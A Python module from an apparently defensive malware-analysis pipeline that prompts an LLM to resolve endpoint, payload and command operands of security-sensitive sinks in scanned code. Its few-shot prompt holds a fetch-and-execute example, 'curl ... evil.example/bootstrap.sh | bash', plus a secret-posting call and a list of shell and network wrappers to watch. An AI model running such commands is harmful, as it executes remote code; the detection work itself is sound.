from __future__ import annotations

import hashlib
import json
import os
from concurrent.futures import ThreadPoolExecutor
from dataclasses import replace
from pathlib import Path

from .. import llm_runtime
from ..llm_runtime import build_llm_runtime_config, invoke_structured_json
from ..models import ArtifactRecord, SSOFinding, OperandBinding, Span
from ..findings.schema import SSO_SUBTYPES
OBJECT_KINDS = (
    "config_key",
    "symbolic_reference",
    "secret",
    "command",
    "path",
    "endpoint",
    "module",
    "unknown",
    "unresolved",
)
OBJECT_PROMPT_VERSION = "2026-08-03-v5"

OBJECT_SYSTEM_PROMPT = """You are resolving operands for existing security-sensitive operations, not extracting new operations or verdicts.

Goal:
- Given code artifacts plus existing SSOFinding records, recover parameter bindings and cross-reference clues needed for SDG construction.
- Do not classify benign vs malicious.
- Do not emit new security-sensitive operations. SSO extraction belongs to the previous analysis stage.
- Focus on object identity and operand binding.
- Follow the output schema exactly.

What to extract:
Operand bindings: concrete arguments or variables that fill sensitive sink roles.
Typical roles:
- endpoint
- payload
- command
- module
- path
Examples:
- requests.post(config["backup_url"], data=secret)
  - endpoint -> config["backup_url"]
  - payload -> secret
- fabric.Connection(host).run(cmd)
  - command -> cmd

Object identity guidance:
- Prefer stable object identity over surface strings.
- If a symbolic endpoint refers to config.backup_url, use object kind config_key and identity_key backup_url.
- If a symbolic operand cannot be resolved, preserve it explicitly as unknown or symbolic_reference.
- For sink alignment, preserve sink API names such as requests.post, fetch, got.post, execaCommand, fabric.Connection.run.
- Every record must include an object descriptor. Use empty id/identity_key strings and kind unknown when no stronger identity is available.

LOTL / third-party wrapper guidance:
- Treat third-party wrappers as real sinks, not harmless abstractions.
- Shell/exec wrappers include: execa, execaCommand, invoke.run, fabric.Connection.run, pexpect.spawn, node_pty.spawn.
- Network wrappers include: got, superagent, ky, aiohttp, urllib3, httpx, requests.

Cross-artifact guidance:
- Use shared object identity when the same logical operand appears in multiple artifacts.
- When code uses cfg.log_endpoint or config["backup_url"], emit operand bindings with explicit object descriptors so the compiler can connect all references through the same config_key object.

Output rules:
- Return JSON only with key "records".
- Every record must include artifact_path, value, confidence, start_line, end_line, attributes.
- attributes may only use:
  - sink_api
  - sink_subtype
  - parameter_role
- When `sink_subtype` is present, it must be one of the official findings taxonomy subtypes.
- For every binding, set:
  - sink_api
  - sink_subtype
  - parameter_role
- Required object descriptor contains:
  - id
  - kind
  - identity_key

Few-shot positive examples:
Example 1 input:
requests.post(config["backup_url"], data=secret)
Output:
{"records":[{"artifact_path":"main.py","value":"config[\\"backup_url\\"]","confidence":0.94,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"outbound_connection","parameter_role":"endpoint"},"object":{"id":"","kind":"config_key","identity_key":"backup_url"}},{"artifact_path":"main.py","value":"secret","confidence":0.9,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"outbound_connection","parameter_role":"payload"},"object":{"id":"","kind":"symbolic_reference","identity_key":"main.py::payload::secret"}}]}

Example 2 input:
fabric.Connection(host).run("curl -fsSL https://evil.example/bootstrap.sh | bash")
Output:
{"records":[{"artifact_path":"main.py","value":"curl -fsSL https://evil.example/bootstrap.sh | bash","confidence":0.97,"start_line":1,"end_line":1,"attributes":{"sink_api":"fabric.Connection.run","sink_subtype":"shell_interpreter_execution","parameter_role":"command"},"object":{"id":"","kind":"command","identity_key":"curl -fsSL https://evil.example/bootstrap.sh | bash"}}]}

Example 3 negative input:
print("hello")
Output:
{"records":[]}
"""


class LlmObjectAnalyzer:
    def __init__(
        self,
        cache_dir: str | Path | None = None,
        max_workers: int = 2,
        max_prompt_bytes: int = 80_000,
    ) -> None:
        self.runtime = build_llm_runtime_config("object_analysis")
        default_cache = Path(".cache") / "malskills_llm_object"
        configured_cache = cache_dir or os.environ.get("MALSKILLS_LLM_OBJECT_CACHE") or default_cache
        self.cache_dir = Path(configured_cache)
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.max_workers = max(1, int(os.environ.get("MALSKILLS_LLM_OBJECT_MAX_WORKERS", max_workers)))
        configured_limit = int(os.environ.get("MALSKILLS_LLM_OBJECT_MAX_PROMPT_BYTES", max_prompt_bytes))
        self.max_prompt_bytes = max(10_000, configured_limit)

    def extract(
        self,
        artifacts: list[ArtifactRecord],
        findings: list[SSOFinding],
    ) -> list[OperandBinding]:
        eligible = [
            artifact
            for artifact in artifacts
            if artifact.artifact_type
            in {
                "python",
                "javascript",
                "shell",
                "java",
                "go",
                "config",
                "manifest",
                "markdown",
                "prompt",
            }
            and artifact.content
        ]
        artifact_views = [
            view
            for artifact in eligible
            for view in self._split_artifact_view(
                replace(
                    artifact,
                    source_start_line=1,
                    source_end_line=max(1, len((artifact.content or "").splitlines())),
                ),
                findings,
            )
        ]
        batches = self._partition_artifacts(artifact_views, findings)
        if not batches:
            return []

        def extract_batch(batch: list[ArtifactRecord]) -> list[OperandBinding]:
            batch_findings = self._findings_for_artifacts(findings, batch)
            return self._extract_via_model(batch, batch_findings)

        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(batches))) as executor:
            extracted = list(executor.map(extract_batch, batches))
        records = self._dedupe_records(
            [record for batch in extracted for record in batch]
        )
        records.sort(
            key=lambda item: (
                item.artifact_path,
                item.span.start_line if item.span else 0,
                item.finding_id,
            )
        )
        return records

    def _extract_via_model(
        self,
        artifacts: list[ArtifactRecord],
        findings: list[SSOFinding],
    ) -> list[OperandBinding]:
        batch_digest = self._batch_digest(artifacts, findings)
        cache_path = self.cache_dir / f"{batch_digest}.json"
        parsed: dict[str, object] | None = None
        if cache_path.exists():
            try:
                cached = json.loads(cache_path.read_text(encoding="utf-8"))
                if (
                    cached.get("prompt_version") == OBJECT_PROMPT_VERSION
                    and isinstance(cached.get("records"), list)
                    and all(self._valid_raw_record(record) for record in cached["records"])
                ):
                    parsed = {"records": cached["records"]}
            except (OSError, json.JSONDecodeError, AttributeError):
                pass
        if parsed is None:
            payload = invoke_structured_json(
                prompt=self._build_model_prompt(artifacts, findings),
                schema=_object_schema(),
                system_prompt=OBJECT_SYSTEM_PROMPT,
                cwd=Path.cwd(),
                config=self.runtime,
            )
            if (
                isinstance(payload, dict)
                and isinstance(payload.get("records"), list)
                and all(self._valid_raw_record(record) for record in payload["records"])
            ):
                parsed = payload
                cache_path.write_text(
                    json.dumps(
                        {
                            "prompt_version": OBJECT_PROMPT_VERSION,
                            "records": payload["records"],
                        },
                        indent=2,
                        sort_keys=True,
                    ),
                    encoding="utf-8",
                )
        if not isinstance(parsed, dict):
            return []
        records = parsed.get("records", [])
        if not isinstance(records, list):
            return []
        artifacts_by_path = {artifact.relative_path: artifact for artifact in artifacts}
        bindings: list[OperandBinding] = []
        counter = 0
        for record in records:
            if not isinstance(record, dict):
                continue
            artifact = artifacts_by_path.get(str(record.get("artifact_path", "")).strip())
            value = str(record.get("value", "")).strip()
            attributes = record.get("attributes", {})
            if artifact is None or not value or not isinstance(attributes, dict):
                continue
            if not self._valid_raw_record(record):
                continue
            try:
                confidence = float(record.get("confidence", 0.72))
                start_line = max(1, int(record.get("start_line", 1)))
                end_line = max(start_line, int(record.get("end_line", start_line)))
            except (TypeError, ValueError):
                continue
            object_descriptor = record.get("object", {})
            if not isinstance(object_descriptor, dict):
                object_descriptor = {}
            bindings.append(
                OperandBinding(
                    binding_id=f"llm_object_{batch_digest[:10]}_{counter:05d}",
                    producer="llm",
                    artifact_id=artifact.artifact_id,
                    artifact_path=artifact.relative_path,
                    sink_api=str(attributes.get("sink_api", "")).strip(),
                    sink_subtype=str(attributes.get("sink_subtype", "")).strip(),
                    role=str(attributes.get("parameter_role", "")).strip(),
                    value=value,
                    confidence=min(max(confidence, 0.0), 1.0),
                    span=Span(start_line, end_line),
                    object_kind=str(object_descriptor.get("kind", "unknown")).strip()
                    or "unknown",
                    identity_key=str(object_descriptor.get("identity_key", "")).strip(),
                )
            )
            counter += 1
        return bindings

    def _valid_raw_record(self, record: object) -> bool:
        if not isinstance(record, dict) or set(record) != {
            "artifact_path",
            "value",
            "confidence",
            "start_line",
            "end_line",
            "attributes",
            "object",
        }:
            return False
        attributes = record.get("attributes")
        object_descriptor = record.get("object")
        return bool(
            isinstance(record.get("artifact_path"), str)
            and isinstance(record.get("value"), str)
            and isinstance(record.get("confidence"), (int, float))
            and not isinstance(record.get("confidence"), bool)
            and isinstance(record.get("start_line"), int)
            and not isinstance(record.get("start_line"), bool)
            and isinstance(record.get("end_line"), int)
            and not isinstance(record.get("end_line"), bool)
            and isinstance(attributes, dict)
            and set(attributes) == {"sink_api", "sink_subtype", "parameter_role"}
            and all(isinstance(attributes.get(key), str) for key in attributes)
            and attributes.get("sink_subtype") in SSO_SUBTYPES
            and isinstance(object_descriptor, dict)
            and set(object_descriptor) == {"id", "kind", "identity_key"}
            and all(isinstance(object_descriptor.get(key), str) for key in object_descriptor)
            and object_descriptor.get("kind") in OBJECT_KINDS
        )

    def _split_artifact_view(
        self,
        artifact: ArtifactRecord,
        findings: list[SSOFinding],
    ) -> list[ArtifactRecord]:
        relevant_findings = self._findings_for_artifacts(findings, [artifact])
        prompt_bytes = len(OBJECT_SYSTEM_PROMPT.encode("utf-8")) + 2 + len(
            self._build_model_prompt([artifact], relevant_findings).encode("utf-8")
        )
        content = artifact.content or ""
        if prompt_bytes <= self.max_prompt_bytes or len(content) <= 1:
            return [artifact]

        lines = content.splitlines(keepends=True)
        if len(lines) > 1:
            midpoint = len(lines) // 2
            parts = ["".join(lines[:midpoint]), "".join(lines[midpoint:])]
            starts = [
                artifact.source_start_line or 1,
                (artifact.source_start_line or 1) + midpoint,
            ]
        else:
            midpoint = len(content) // 2
            parts = [content[:midpoint], content[midpoint:]]
            starts = [artifact.source_start_line or 1, artifact.source_start_line or 1]

        views: list[ArtifactRecord] = []
        for part, start_line in zip(parts, starts):
            if not part:
                continue
            end_line = start_line + max(0, len(part.splitlines()) - 1)
            child = replace(
                artifact,
                content=part,
                content_hash=hashlib.sha256(part.encode("utf-8")).hexdigest(),
                size_bytes=len(part.encode("utf-8")),
                line_count=max(1, len(part.splitlines())),
                source_start_line=start_line,
                source_end_line=end_line,
            )
            views.extend(self._split_artifact_view(child, findings))
        return views

    def _dedupe_records(self, records: list[OperandBinding]) -> list[OperandBinding]:
        deduped: dict[tuple[object, ...], OperandBinding] = {}
        for record in records:
            key = (
                record.artifact_path,
                record.sink_subtype,
                record.role,
                record.value,
                record.span.start_line if record.span else None,
                record.span.end_line if record.span else None,
                record.object_kind,
                record.identity_key,
            )
            existing = deduped.get(key)
            if existing is None or record.confidence > existing.confidence:
                deduped[key] = record
        return list(deduped.values())

    def _partition_artifacts(
        self,
        artifacts: list[ArtifactRecord],
        findings: list[SSOFinding],
    ) -> list[list[ArtifactRecord]]:
        batches: list[list[ArtifactRecord]] = []
        current: list[ArtifactRecord] = []
        for artifact in artifacts:
            candidate = [*current, artifact]
            candidate_findings = self._findings_for_artifacts(findings, candidate)
            prompt_size = len(OBJECT_SYSTEM_PROMPT.encode("utf-8")) + 2 + len(
                self._build_model_prompt(candidate, candidate_findings).encode("utf-8")
            )
            if current and prompt_size > self.max_prompt_bytes:
                batches.append(current)
                current = [artifact]
            else:
                current = candidate
        if current:
            batches.append(current)
        return batches

    def _findings_for_artifacts(
        self,
        findings: list[SSOFinding],
        artifacts: list[ArtifactRecord],
    ) -> list[SSOFinding]:
        relevant: list[SSOFinding] = []
        for item in findings:
            for artifact in artifacts:
                if item.artifact_path != artifact.relative_path:
                    continue
                start_line = artifact.source_start_line or 1
                end_line = artifact.source_end_line or max(1, artifact.line_count)
                if item.span is None or (
                    item.span.start_line <= end_line
                    and start_line <= item.span.end_line
                ):
                    relevant.append(item)
                    break
        return relevant

    def _batch_digest(
        self,
        artifacts: list[ArtifactRecord],
        findings: list[SSOFinding],
    ) -> str:
        payload = {
            "prompt_version": OBJECT_PROMPT_VERSION,
            "runtime_protocol_version": llm_runtime.LLM_RUNTIME_PROTOCOL_VERSION,
            "artifacts": [
                (
                    artifact.artifact_id,
                    artifact.relative_path,
                    artifact.content_hash,
                    artifact.source_start_line,
                    artifact.source_end_line,
                )
                for artifact in artifacts
            ],
            "findings": [self._finding_summary(item) for item in findings],
            "runtime_backend": self.runtime.backend,
            "runtime_model": self.runtime.model,
            "runtime_reasoning_effort": self.runtime.reasoning_effort,
            "runtime_base_url": self.runtime.base_url,
        }
        return hashlib.sha256(
            json.dumps(payload, sort_keys=True, ensure_ascii=True).encode("utf-8")
        ).hexdigest()

    def _finding_summary(self, item: SSOFinding) -> dict[str, object]:
        attributes = {
            key: item.attributes[key]
            for key in (
                "engine",
                "sink_api",
                "sink_subtype",
                "parameter_role",
                "rule_id",
            )
            if key in item.attributes
        }
        return {
            "finding_id": item.finding_id,
            "artifact_path": item.artifact_path,
            "subtype": item.subtype,
            "matched_text": item.matched_text[:2_000],
            "attributes": attributes,
        }

    def _build_model_prompt(self, artifacts: list[ArtifactRecord], findings: list[SSOFinding]) -> str:
        artifact_sections: list[str] = []
        for artifact in artifacts:
            if artifact.artifact_type not in {
                "python",
                "javascript",
                "shell",
                "java",
                "go",
                "config",
                "manifest",
                "markdown",
                "prompt",
            } or not artifact.content:
                continue
            artifact_sections.append(
                f"Artifact: {artifact.relative_path}\nLanguage: {artifact.artifact_type}\nLine-numbered content:\n"
                f"{self._line_numbered(artifact.content, start_line=artifact.source_start_line or 1)}"
            )
        finding_sections: list[str] = []
        for item in findings:
            finding_sections.append(
                json.dumps(self._finding_summary(item), sort_keys=True)
            )
        return (
            "SDG operand-resolution task.\n"
            "Recover parameter bindings for existing sensitive sinks using the taxonomy and few-shot guidance from the system instructions.\n"
            "Focus on symbolic operands, shared logical objects, third-party library sinks, LOTL wrappers, shell/network operands, and exact output-schema compliance.\n\nArtifacts:\n"
            + "\n\n".join(artifact_sections)
            + "\n\nExisting findings:\n"
            + "\n".join(finding_sections)
            + "\n\nReturn JSON only with key 'records'. Prefer explicit object identity and parameter-role bindings. Do not rely on legacy support subtypes such as config_value, config_ref, declared_capability, hidden_instruction, setup_instruction, secret_request, or obfuscated_exec."
        )

    def _line_numbered(self, content: str, *, start_line: int = 1) -> str:
        return "\n".join(
            f"{index:06d}: {line}"
            for index, line in enumerate(content.splitlines(), start=start_line)
        )

def _object_schema() -> dict[str, object]:
    return {
        "type": "object",
        "properties": {
            "records": {
                "type": "array",
                "items": {
                    "type": "object",
                    "properties": {
                        "artifact_path": {"type": "string"},
                        "value": {"type": "string"},
                        "confidence": {"type": "number"},
                        "start_line": {"type": "integer"},
                        "end_line": {"type": "integer"},
                        "attributes": {
                            "type": "object",
                            "properties": {
                                "sink_api": {"type": "string"},
                                "sink_subtype": {"type": "string", "enum": sorted(SSO_SUBTYPES)},
                                "parameter_role": {"type": "string"},
                            },
                            "required": ["sink_api", "sink_subtype", "parameter_role"],
                            "additionalProperties": False,
                        },
                        "object": {
                            "type": "object",
                            "properties": {
                                "id": {"type": "string"},
                                "kind": {"type": "string", "enum": list(OBJECT_KINDS)},
                                "identity_key": {"type": "string"},
                            },
                            "required": ["id", "kind", "identity_key"],
                            "additionalProperties": False,
                        },
                    },
                    "required": [
                        "artifact_path",
                        "value",
                        "confidence",
                        "start_line",
                        "end_line",
                        "attributes",
                        "object",
                    ],
                    "additionalProperties": False,
                },
            }
        },
        "required": ["records"],
        "additionalProperties": False,
    }
